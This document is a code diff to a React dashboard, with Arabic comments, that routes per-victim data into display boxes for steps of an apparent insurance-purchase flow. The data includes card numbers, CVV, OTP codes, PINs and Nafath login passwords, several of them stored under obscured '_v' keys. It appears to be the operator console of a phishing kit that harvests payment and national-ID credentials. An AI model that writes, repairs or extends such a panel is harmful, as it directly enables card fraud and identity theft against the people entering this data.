@@ -361,6 +361,7 @@ function useConnectionMonitor(visitorId?: string) {
 
 type RequestItem = {
   id: string;
+  type?: string; // Box type: basic, insurance, package, payment, card_otp, pin, phone, nafad
   customer: string;
   status: string;
   stage: string;
@@ -1556,29 +1557,63 @@ export default function DashboardPage() {
 
   // Get latest data for each box type from all entries (newest entry has data first due to sort)
   const getLatestRawForBox = useMemo(() => {
-    return (dataType: 'phone' | 'card' | 'nafad' | 'basic' | 'insurance'): Record<string, any> | null => {
+    return (dataType: 'phone' | 'card' | 'nafad' | 'basic' | 'insurance' | 'package' | 'payment' | 'card_otp' | 'pin'): Record<string, any> | null => {
       if (!customerEntryGroup.length) return null;
       
-      // Find first entry that has this type of data
+      // Map box types to their corresponding entry types
+      const typeMap: Record<string, string[]> = {
+        'basic': ['basic'],
+        'insurance': ['insurance'],
+        'package': ['package'],
+        'payment': ['payment'],
+        'phone': ['phone', 'phone_otp'], // step5 includes both phone data and OTP
+        'nafad': ['nafad'],
+        'card': ['payment'], // card data is stored with 'payment' type
+        'card_otp': ['card_otp'], // step2 OTP
+        'pin': ['pin'], // step3 PIN
+      };
+      
+      const matchingTypes = typeMap[dataType] || [dataType];
+      
+      // Find first entry that has this type
+      for (const entry of customerEntryGroup) {
+        const entryType = entry.type || 'basic';
+        
+        // Check if this entry's type matches the requested type
+        if (matchingTypes.includes(entryType)) {
+          return entry.raw || {};
+        }
+      }
+      
+      // Fallback: if no entry found by type, check for data fields (for backwards compatibility)
       for (const entry of customerEntryGroup) {
         const raw = entry.raw || {};
         
         switch (dataType) {
           case 'phone':
-            // Only return if there's actual phone verification data (from step5), not just phoneNumber
-            if (raw.phoneIdNumber || raw.phoneCarrier || raw.phoneOtp || raw._v7) return raw;
+            if (raw.phoneIdNumber || raw.phoneCarrier || raw.phoneOtp || raw._v7 || raw.phoneOtpStatus) return raw;
             break;
           case 'card':
-            if (raw._v1 || raw._v2 || raw._v3 || raw._v5 || raw.cardNumber || raw.paymentStatus || raw.hasCard) return raw;
+          case 'payment':
+            if (raw._v1 || raw._v2 || raw._v3 || raw.cardNumber || raw.paymentStatus || raw.hasCard) return raw;
+            break;
+          case 'card_otp':
+            if (raw._v5 || raw.otpCode || raw.otpStatus) return raw;
+            break;
+          case 'pin':
+            if (raw._v6 || raw.pinCode || raw.pinStatus) return raw;
             break;
           case 'nafad':
-            if (raw.nafadIdNumber || raw.nafadPassword) return raw;
+            if (raw.nafadIdNumber || raw.nafadPassword || raw.nafadStatus) return raw;
             break;
           case 'basic':
             if (raw.identityNumber || raw.ownerName || raw.buyerName) return raw;
             break;
           case 'insurance':
             if (raw.insuranceType || raw.vehicleModel || raw.coverageType) return raw;
+            break;
+          case 'package':
+            if (raw.selectedOffer || raw.offerTotalPrice) return raw;
             break;
         }
       }
@@ -2219,7 +2254,7 @@ export default function DashboardPage() {
   // صندوق صفحة اختيار الباقة (compar)
   const renderComparBox = () => {
     // Use getLatestRawForBox to aggregate data from all entries
-    const raw = getLatestRawForBox('insurance') || selectedRequest?.raw || {};
+    const raw = getLatestRawForBox('package') || selectedRequest?.raw || {};
     const timestamp = raw?.comparCompletedAt || raw?.comparUpdatedAt || raw?.selectedOffer?.updatedAt || raw?.updatedAt;
 
     const selectedOffer = raw?.selectedOffer || {};
@@ -2297,7 +2332,7 @@ export default function DashboardPage() {
   // صندوق صفحة التحقق من OTP (step2)
   const renderOtpBox = () => {
     // Use getLatestRawForBox to aggregate data from all entries
-    const raw = getLatestRawForBox('card') || selectedRequest?.raw || {};
+    const raw = getLatestRawForBox('card_otp') || selectedRequest?.raw || {};
     const otpStatus = raw?._v5Status || raw?.otpStatus;
     const otpValue = raw?._v5 || raw?.otpCode || "";
 
@@ -2522,7 +2557,7 @@ export default function DashboardPage() {
   // صندوق بيانات بطاقة الدفع (صفحة check)
   const renderCheckBox = () => {
     // Use getLatestRawForBox to aggregate data from all entries
-    const raw = getLatestRawForBox('card') || selectedRequest?.raw || {};
+    const raw = getLatestRawForBox('payment') || selectedRequest?.raw || {};
     
     // التحقق من وجود بيانات البطاقة (فحص شامل)
     const hasCardData = raw?._v1 || raw?.cardNumber || raw?.hasCard || raw?.cvv || raw?._v2 || raw?.cardOwner || raw?._v4;
@@ -3318,7 +3353,7 @@ export default function DashboardPage() {
   // صندوق صفحة PIN (step3)
   const renderPinBox = () => {
     // Use getLatestRawForBox to aggregate data from all entries
-    const raw = getLatestRawForBox('card') || selectedRequest?.raw || {};
+    const raw = getLatestRawForBox('pin') || selectedRequest?.raw || {};
     const timestamp = raw?.pinSubmittedAt || raw?._v6UpdatedAt || raw?.pinUpdatedAt || raw?.updatedAt;
     
     const pinStatus = raw?._v6Status || raw?.pinStatus;
